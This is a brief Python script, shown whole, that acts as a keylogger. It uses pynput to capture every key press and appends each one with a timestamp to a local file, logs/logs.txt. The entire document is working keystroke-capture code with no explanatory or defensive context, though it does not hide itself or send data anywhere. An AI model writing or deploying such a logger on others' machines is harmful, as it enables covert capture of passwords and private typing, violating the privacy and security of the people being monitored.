import os
from pynput.keyboard import Listener
import logging


log_dir = "logs"
os.makedirs(log_dir, exist_ok=True)

logging.basicConfig(
    filename=os.path.join(log_dir, "logs.txt"),
    level=logging.DEBUG,
    format="%(asctime)s: %(message)s"
)


def on_press(key):
    logging.info(key)


with Listener(on_press=on_press) as listener:
    listener.join()
